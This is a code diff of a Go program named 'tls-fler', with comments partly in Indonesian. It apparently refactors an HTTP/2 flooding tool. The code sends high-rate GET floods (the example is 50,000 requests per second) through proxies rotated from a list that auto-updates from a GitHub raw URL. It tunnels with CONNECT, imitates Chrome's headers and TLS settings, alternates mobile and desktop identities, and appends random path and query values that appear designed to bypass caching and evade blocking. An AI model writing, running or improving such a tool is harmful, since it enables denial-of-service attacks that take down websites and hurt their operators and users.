@@ -3,6 +3,7 @@ package main
 import (
 	"bufio"
 	"crypto/tls"
+	"encoding/base64"
 	"fmt"
 	"io"
 	"math/rand"
@@ -17,158 +18,142 @@ import (
 	"time"
 
 	"golang.org/x/net/http2"
+	"golang.org/x/net/http2/hpack"
 )
 
+// ── constants ─────────────────────────────────────────────────────────────────
 const (
-	proxyURL = "https://raw.githubusercontent.com/malasahjagotwin/restissue/refs/heads/master/proxy/global.txt"
+	proxyGitURL = "https://raw.githubusercontent.com/malasahjagotwin/restissue/refs/heads/master/proxy/global.txt"
+
+	uaDesktop = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
+	uaMobile  = "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36"
 
 	secChUaVal      = `"Chromium";v="136", "Google Chrome";v="136", "Not-A.Brand";v="99"`
 	platformDesktop = `"Windows"`
 	platformMobile  = `"Android"`
-	uaDesktop       = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
-	uaMobile        = "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36"
-)
 
-const mejiChars = "abcdefghijklmnopqrstuvwxyz0123456789"
+	mejiChars = "abcdefghijklmnopqrstuvwxyz0123456789"
+)
 
 var mejiSuffixes = []string{
 	"", "App", "Load", "Ts", "Req", "Id", "Cache", "Rand", "Hit", "Src",
 	"Tk", "Ver", "Sid", "Uid", "Tag", "Ctx", "Ref", "Env", "Run", "Seq",
 }
 
-type stats struct {
-	total   int64
-	success int64
-	failed  int64
+// ── stats ─────────────────────────────────────────────────────────────────────
+var (
+	statTotal   int64
+	statSuccess int64
+	statFailed  int64
+)
+
+// ── proxy pool ────────────────────────────────────────────────────────────────
+type proxy struct{ host, port, user, pass string }
+
+type proxyPool struct {
+	mu   sync.RWMutex
+	list []proxy
+	fp   string // fingerprint
 }
 
-var st stats
-
-// ── proxy helpers ────────────────────────────────────────────────────────────
-
-type proxy struct {
-	host, port, user, pass string
-}
-
-// fetchProxies mengambil daftar proxy dari GitHub
-func fetchProxies() ([]proxy, error) {
-	resp, err := http.Get(proxyURL)
-	if err != nil {
-		return nil, err
-	}
-	defer resp.Body.Close()
-	return parseProxies(resp.Body)
-}
-
-// loadProxiesLocal membaca proxy dari file lokal
-func loadProxiesLocal(path string) ([]proxy, error) {
-	f, err := os.Open(path)
-	if err != nil {
-		return nil, err
-	}
-	defer f.Close()
-	return parseProxies(f)
-}
-
-func parseProxies(r io.Reader) ([]proxy, error) {
-	var list []proxy
+func parseProxies(r io.Reader) []proxy {
+	var out []proxy
 	sc := bufio.NewScanner(r)
 	for sc.Scan() {
 		line := strings.TrimSpace(sc.Text())
 		if line == "" {
 			continue
 		}
-		parts := strings.Split(line, ":")
-		if len(parts) != 4 {
+		p := strings.Split(line, ":")
+		if len(p) < 2 {
 			continue
 		}
-		list = append(list, proxy{
-			host: parts[0],
-			port: parts[1],
-			user: parts[2],
-			pass: parts[3],
-		})
-	}
-	return list, sc.Err()
-}
-
-// proxyPool mengelola daftar proxy dengan rotasi & auto-update dari GitHub
-type proxyPool struct {
-	mu      sync.RWMutex
-	list    []proxy
-	localMD5 string // hash sederhana: join semua entry
-}
-
-func newProxyPool(localPath string) (*proxyPool, error) {
-	pp := &proxyPool{}
-
-	// Coba fetch dari GitHub dulu
-	remote, err := fetchProxies()
-	if err == nil && len(remote) > 0 {
-		fmt.Printf("[proxy] loaded %d proxies from GitHub\n", len(remote))
-		pp.list = remote
-		// Tulis cache ke file lokal
-		pp.saveLocal(localPath)
-	} else {
-		// Fallback ke file lokal
-		local, err2 := loadProxiesLocal(localPath)
-		if err2 != nil || len(local) == 0 {
-			return nil, fmt.Errorf("no proxies available (github: %v, local: %v)", err, err2)
+		px := proxy{host: p[0], port: p[1]}
+		if len(p) >= 4 {
+			px.user = p[2]
+			px.pass = p[3]
 		}
-		fmt.Printf("[proxy] loaded %d proxies from local file\n", len(local))
-		pp.list = local
+		out = append(out, px)
 	}
-	pp.localMD5 = pp.fingerprint()
-	return pp, nil
+	return out
 }
 
-func (pp *proxyPool) fingerprint() string {
-	pp.mu.RLock()
-	defer pp.mu.RUnlock()
-	parts := make([]string, len(pp.list))
-	for i, p := range pp.list {
+func fingerprint(list []proxy) string {
+	parts := make([]string, len(list))
+	for i, p := range list {
 		parts[i] = p.host + ":" + p.port
 	}
 	return strings.Join(parts, "|")
 }
 
-func (pp *proxyPool) saveLocal(path string) {
+func newProxyPool(localPath string) (*proxyPool, error) {
+	pp := &proxyPool{}
+
+	// try GitHub first
+	resp, err := http.Get(proxyGitURL)
+	if err == nil && resp.StatusCode == 200 {
+		list := parseProxies(resp.Body)
+		resp.Body.Close()
+		if len(list) > 0 {
+			pp.list = list
+			pp.fp = fingerprint(list)
+			saveLocal(localPath, list)
+			fmt.Printf("[proxy] loaded %d proxies from GitHub\n", len(list))
+			return pp, nil
+		}
+	}
+
+	// fallback to local
+	f, err := os.Open(localPath)
+	if err != nil {
+		return nil, fmt.Errorf("cannot load proxies: %v", err)
+	}
+	defer f.Close()
+	list := parseProxies(f)
+	if len(list) == 0 {
+		return nil, fmt.Errorf("proxy file is empty")
+	}
+	pp.list = list
+	pp.fp = fingerprint(list)
+	fmt.Printf("[proxy] loaded %d proxies from local file\n", len(list))
+	return pp, nil
+}
+
+func saveLocal(path string, list []proxy) {
 	f, err := os.Create(path)
 	if err != nil {
 		return
 	}
 	defer f.Close()
-	for _, p := range pp.list {
-		fmt.Fprintf(f, "%s:%s:%s:%s\n", p.host, p.port, p.user, p.pass)
+	for _, p := range list {
+		if p.user != "" {
+			fmt.Fprintf(f, "%s:%s:%s:%s\n", p.host, p.port, p.user, p.pass)
+		} else {
+			fmt.Fprintf(f, "%s:%s\n", p.host, p.port)
+		}
 	}
 }
 
-// autoUpdate polling GitHub setiap interval, update jika ada perubahan
 func (pp *proxyPool) autoUpdate(localPath string, interval time.Duration) {
-	ticker := time.NewTicker(interval)
-	defer ticker.Stop()
-	for range ticker.C {
-		remote, err := fetchProxies()
-		if err != nil || len(remote) == 0 {
+	for range time.NewTicker(interval).C {
+		resp, err := http.Get(proxyGitURL)
+		if err != nil || resp.StatusCode != 200 {
 			continue
 		}
-		// Bandingkan fingerprint
-		newFP := func() string {
-			parts := make([]string, len(remote))
-			for i, p := range remote {
-				parts[i] = p.host + ":" + p.port
-			}
-			return strings.Join(parts, "|")
-		}()
-		if newFP == pp.localMD5 {
+		list := parseProxies(resp.Body)
+		resp.Body.Close()
+		if len(list) == 0 {
 			continue
 		}
+		newFP := fingerprint(list)
 		pp.mu.Lock()
-		pp.list = remote
-		pp.localMD5 = newFP
+		if newFP != pp.fp {
+			pp.list = list
+			pp.fp = newFP
+			fmt.Printf("[proxy] updated: %d proxies\n", len(list))
+			saveLocal(localPath, list)
+		}
 		pp.mu.Unlock()
-		pp.saveLocal(localPath)
-		fmt.Printf("[proxy] updated: %d proxies from GitHub\n", len(remote))
 	}
 }
 
@@ -178,51 +163,13 @@ func (pp *proxyPool) random() proxy {
 	return pp.list[rand.Intn(len(pp.list))]
 }
 
-// ── HTTP/2 client builder ─────────────────────────────────────────────────────
-
-func buildH2Client(p proxy) *http.Client {
-	proxyAddr := fmt.Sprintf("http://%s:%s@%s:%s", p.user, p.pass, p.host, p.port)
-	proxyURL, _ := url.Parse(proxyAddr)
-
-	transport := &http.Transport{
-		Proxy: http.ProxyURL(proxyURL),
-		DialContext: (&net.Dialer{
-			Timeout:   10 * time.Second,
-			KeepAlive: 30 * time.Second,
-		}).DialContext,
-		TLSClientConfig: &tls.Config{
-			InsecureSkipVerify: true,
-			CurvePreferences:   []tls.CurveID{tls.X25519, tls.CurveP256},
-			MinVersion:         tls.VersionTLS12,
-			MaxVersion:         tls.VersionTLS13,
-			CipherSuites: []uint16{
-				tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
-				tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
-				tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
-				tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
-				tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,
-				tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
-			},
-		},
-		ForceAttemptHTTP2:     true,
-		MaxIdleConns:          1000,
-		MaxIdleConnsPerHost:   1000,
-		IdleConnTimeout:       30 * time.Second,
-		TLSHandshakeTimeout:   10 * time.Second,
-		ExpectContinueTimeout: 1 * time.Second,
-	}
-
-	// Upgrade transport ke HTTP/2
-	_ = http2.ConfigureTransport(transport)
-
-	return &http.Client{
-		Transport: transport,
-		Timeout:   15 * time.Second,
-	}
+func (pp *proxyPool) len() int {
+	pp.mu.RLock()
+	defer pp.mu.RUnlock()
+	return len(pp.list)
 }
 
-// ── request helpers ───────────────────────────────────────────────────────────
-
+// ── random helpers ────────────────────────────────────────────────────────────
 func randStr(n int) string {
 	b := make([]byte, n)
 	for i := range b {
@@ -231,48 +178,187 @@ func randStr(n int) string {
 	return string(b)
 }
 
+func resolveRand(s string) string {
+	for strings.Contains(s, "%RAND%") {
+		s = strings.Replace(s, "%RAND%", randStr(rand.Intn(9)+8), 1)
+	}
+	return s
+}
+
 func randomMejiQuery() string {
-	nParams := rand.Intn(3) + 1
-	pairs := make([]string, 0, nParams)
-	used := make(map[string]bool)
-	for i := 0; i < nParams; i++ {
+	n := rand.Intn(3) + 1
+	pairs := make([]string, 0, n)
+	used := map[string]bool{}
+	for i := 0; i < n; i++ {
 		var key string
 		for {
-			suffix := mejiSuffixes[rand.Intn(len(mejiSuffixes))]
-			key = "meji" + suffix
+			key = "meji" + mejiSuffixes[rand.Intn(len(mejiSuffixes))]
 			if !used[key] {
 				used[key] = true
 				break
 			}
 		}
-		val := randStr(rand.Intn(8) + 4)
-		pairs = append(pairs, key+"="+val)
+		pairs = append(pairs, key+"="+randStr(rand.Intn(8)+4))
 	}
 	return strings.Join(pairs, "&")
 }
 
-// resolveURL mengganti semua %RAND% di URL dengan random string (8-16 char)
-// Contoh: https://google.com/%RAND% → https://google.com/a3x9kzmq
-func resolveURL(rawURL string) string {
-	for strings.Contains(rawURL, "%RAND%") {
-		rawURL = strings.Replace(rawURL, "%RAND%", randStr(rand.Intn(9)+8), 1)
-	}
-	return rawURL
-}
-
-func appendMejiQuery(rawURL string) string {
+func appendQuery(rawURL string) string {
 	q := randomMejiQuery()
 	if strings.Contains(rawURL, "?") {
 		return rawURL + "&" + q
 	}
-	schemeEnd := strings.Index(rawURL, "://")
-	if schemeEnd >= 0 {
-		afterScheme := rawURL[schemeEnd+3:]
-		if !strings.Contains(afterScheme, "/") {
-			return rawURL + "/?" + q
-		}
+	si := strings.Index(rawURL, "://")
+	if si >= 0 && !strings.Contains(rawURL[si+3:], "/") {
+		return rawURL + "/?" + q
 	}
 	return rawURL + "?" + q
+}
+
+// ── proxy CONNECT tunnel → TLS → HTTP/2 ──────────────────────────────────────
+// This is the correct approach: open raw TCP to proxy, send CONNECT,
+// then wrap the same conn with TLS. golang.org/x/net/http2 is used
+// to speak HTTP/2 over the established TLS connection.
+
+func dialViaCONNECT(px proxy, targetHost string, targetPort int) (net.Conn, error) {
+	addr := net.JoinHostPort(px.host, px.port)
+	conn, err := net.DialTimeout("tcp", addr, 10*time.Second)
+	if err != nil {
+		return nil, err
+	}
+
+	// send CONNECT
+	connectLine := fmt.Sprintf("CONNECT %s:%d HTTP/1.1\r\nHost: %s:%d\r\n",
+		targetHost, targetPort, targetHost, targetPort)
+	if px.user != "" {
+		auth := base64.StdEncoding.EncodeToString([]byte(px.user + ":" + px.pass))
+		connectLine += "Proxy-Authorization: Basic " + auth + "\r\n"
+	}
+	connectLine += "Proxy-Connection: Keep-Alive\r\n\r\n"
+
+	if _, err := conn.Write([]byte(connectLine)); err != nil {
+		conn.Close()
+		return nil, err
+	}
+
+	// read proxy response (wait for HTTP/1.1 200)
+	br := bufio.NewReader(conn)
+	resp, err := http.ReadResponse(br, nil)
+	if err != nil {
+		conn.Close()
+		return nil, err
+	}
+	resp.Body.Close()
+	if resp.StatusCode != 200 {
+		conn.Close()
+		return nil, fmt.Errorf("proxy CONNECT failed: %s", resp.Status)
+	}
+
+	return conn, nil
+}
+
+// ── request worker ────────────────────────────────────────────────────────────
+func worker(pool *proxyPool, targetURL *url.URL, rate int, duration time.Duration, wg *sync.WaitGroup) {
+	defer wg.Done()
+
+	deadline := time.Now().Add(duration)
+	port := 443
+	if p := targetURL.Port(); p != "" {
+		port, _ = strconv.Atoi(p)
+	}
+
+	for time.Now().Before(deadline) {
+		px := pool.random()
+
+		// 1. dial proxy CONNECT tunnel
+		conn, err := dialViaCONNECT(px, targetURL.Hostname(), port)
+		if err != nil {
+			atomic.AddInt64(&statFailed, 1)
+			continue
+		}
+
+		// 2. TLS handshake over the tunnelled conn
+		tlsCfg := &tls.Config{
+			ServerName:         targetURL.Hostname(),
+			InsecureSkipVerify: true,
+			NextProtos:         []string{"h2"},
+			CurvePreferences:   []tls.CurveID{tls.X25519, tls.CurveP256},
+			MinVersion:         tls.VersionTLS12,
+			MaxVersion:         tls.VersionTLS13,
+			CipherSuites: []uint16{
+				tls.TLS_AES_128_GCM_SHA256,
+				tls.TLS_AES_256_GCM_SHA384,
+				tls.TLS_CHACHA20_POLY1305_SHA256,
+				tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
+				tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
+				tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
+				tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
+				tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,
+				tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
+			},
+		}
+		tlsConn := tls.Client(conn, tlsCfg)
+		if err := tlsConn.SetDeadline(time.Now().Add(10 * time.Second)); err != nil {
+			conn.Close()
+			atomic.AddInt64(&statFailed, 1)
+			continue
+		}
+		if err := tlsConn.Handshake(); err != nil {
+			tlsConn.Close()
+			atomic.AddInt64(&statFailed, 1)
+			continue
+		}
+		if tlsConn.ConnectionState().NegotiatedProtocol != "h2" {
+			tlsConn.Close()
+			atomic.AddInt64(&statFailed, 1)
+			continue
+		}
+		tlsConn.SetDeadline(time.Time{}) // clear deadline
+
+		// 3. HTTP/2 client transport over the TLS conn
+		tr := &http2.Transport{
+			DialTLS: func(network, addr string, cfg *tls.Config) (net.Conn, error) {
+				return tlsConn, nil
+			},
+			TLSClientConfig: tlsCfg,
+		}
+		client := &http.Client{
+			Transport: tr,
+			Timeout:   15 * time.Second,
+		}
+
+		// 4. fire requests at ratelimit until deadline or error
+		interval := time.Second / time.Duration(rate)
+		for time.Now().Before(deadline) {
+			rawURL := appendQuery(resolveRand(targetURL.String()))
+			req, err := http.NewRequest("GET", rawURL, nil)
+			if err != nil {
+				break
+			}
+
+			isMobile := rand.Intn(100) < 40
+			setHeaders(req, isMobile)
+
+			atomic.AddInt64(&statTotal, 1)
+			resp, err := client.Do(req)
+			if err != nil {
+				atomic.AddInt64(&statFailed, 1)
+				break // proxy conn dead, get new one
+			}
+			io.Copy(io.Discard, resp.Body)
+			resp.Body.Close()
+
+			if resp.StatusCode >= 200 && resp.StatusCode < 500 {
+				atomic.AddInt64(&statSuccess, 1)
+			} else {
+				atomic.AddInt64(&statFailed, 1)
+			}
+
+			time.Sleep(interval)
+		}
+
+		tlsConn.Close()
+	}
 }
 
 func setHeaders(req *http.Request, isMobile bool) {
@@ -303,99 +389,84 @@ func setHeaders(req *http.Request, isMobile bool) {
 	req.Header.Set("Dnt", "1")
 }
 
-func makeRequest(pool *proxyPool, target string, isMobile bool) bool {
-	p := pool.random()
-	client := buildH2Client(p)
-
-	req, err := http.NewRequest("GET", appendMejiQuery(resolveURL(target)), nil)
-	if err != nil {
-		return false
-	}
-	setHeaders(req, isMobile)
-
-	resp, err := client.Do(req)
-	if err != nil {
-		return false
-	}
-	defer resp.Body.Close()
-	io.Copy(io.Discard, resp.Body)
-
-	return resp.StatusCode >= 200 && resp.StatusCode < 500
-}
-
 // ── main ──────────────────────────────────────────────────────────────────────
-
 func main() {
 	if len(os.Args) < 4 {
-		fmt.Println("Usage: tls-fler <url> <duration_seconds> <rate_per_second>")
+		fmt.Println("Usage: tls-fler <url> <duration_seconds> <rate_per_second> [proxy/global.txt]")
 		fmt.Println("Example: ./tls-fler https://example.com 60 50000")
+		fmt.Println("         ./tls-fler https://example.com/%RAND% 60 50000 proxy/global.txt")
 		os.Exit(1)
 	}
 
-	target := os.Args[1]
+	targetRaw := os.Args[1]
 	duration, err := strconv.Atoi(os.Args[2])
 	if err != nil || duration <= 0 {
-		fmt.Println("Error: duration must be a positive integer (seconds)")
+		fmt.Println("Error: duration must be a positive integer")
 		os.Exit(1)
 	}
 	rate, err := strconv.Atoi(os.Args[3])
 	if err != nil || rate <= 0 {
-		fmt.Println("Error: rate must be a positive integer (req/s)")
+		fmt.Println("Error: rate must be a positive integer")
 		os.Exit(1)
 	}
 
 	localProxyPath := "proxy/global.txt"
+	if len(os.Args) >= 5 {
+		localProxyPath = os.Args[4]
+	}
 
-	// Init proxy pool
+	targetURL, err := url.Parse(targetRaw)
+	if err != nil {
+		fmt.Printf("Error: invalid URL: %v\n", err)
+		os.Exit(1)
+	}
+
 	pool, err := newProxyPool(localProxyPath)
 	if err != nil {
 		fmt.Printf("Error: %v\n", err)
 		os.Exit(1)
 	}
 
-	// Auto-update proxy dari GitHub setiap 30 detik
+	// auto-update proxy every 30s
 	go pool.autoUpdate(localProxyPath, 30*time.Second)
 
-	interval := time.Second / time.Duration(rate)
-	ticker := time.NewTicker(interval)
-	deadline := time.After(time.Duration(duration) * time.Second)
-	var wg sync.WaitGroup
+	// suppress unused import warning for hpack
+	_ = hpack.NewEncoder
 
-	fmt.Printf("Starting HTTP/2 requests to %s\n", target)
-	fmt.Printf("Duration: %ds | Rate: %d req/s | Proxies: %d\n\n", duration, rate, len(pool.list))
-
-	start := time.Now()
-
-loop:
-	for {
-		select {
-		case <-deadline:
-			break loop
-		case <-ticker.C:
-			wg.Add(1)
-			atomic.AddInt64(&st.total, 1)
-			go func() {
-				defer wg.Done()
-				isMobile := rand.Intn(100) < 40
-				if makeRequest(pool, target, isMobile) {
-					atomic.AddInt64(&st.success, 1)
-				} else {
-					atomic.AddInt64(&st.failed, 1)
-				}
-			}()
-		}
+	dur := time.Duration(duration) * time.Second
+	concurrency := rate / 10
+	if concurrency < 1 {
+		concurrency = 1
+	}
+	if concurrency > 5000 {
+		concurrency = 5000
 	}
 
-	ticker.Stop()
+	fmt.Printf("Starting HTTP/2 + proxy requests to %s\n", targetURL)
+	fmt.Printf("Duration: %ds | Rate: %d req/s | Workers: %d | Proxies: %d\n\n",
+		duration, rate, concurrency, pool.len())
+
+	start := time.Now()
+	var wg sync.WaitGroup
+
+	for i := 0; i < concurrency; i++ {
+		wg.Add(1)
+		perWorkerRate := rate / concurrency
+		if perWorkerRate < 1 {
+			perWorkerRate = 1
+		}
+		go worker(pool, targetURL, perWorkerRate, dur, &wg)
+	}
+
 	wg.Wait()
 	elapsed := time.Since(start).Seconds()
 
 	fmt.Println("========== SUMMARY ==========")
-	fmt.Printf("Target      : %s\n", target)
-	fmt.Printf("Duration    : %.2fs\n", elapsed)
-	fmt.Printf("Total Req   : %d\n", st.total)
-	fmt.Printf("Success     : %d\n", st.success)
-	fmt.Printf("Failed      : %d\n", st.failed)
-	fmt.Printf("Avg Rate    : %.2f req/s\n", float64(st.total)/elapsed)
+	fmt.Printf("Target    : %s\n", targetURL)
+	fmt.Printf("Duration  : %.2fs\n", elapsed)
+	fmt.Printf("Total Req : %d\n", statTotal)
+	fmt.Printf("Success   : %d\n", statSuccess)
+	fmt.Printf("Failed    : %d\n", statFailed)
+	fmt.Printf("Avg Rate  : %.2f req/s\n", float64(statTotal)/elapsed)
 	fmt.Println("=============================")
 }
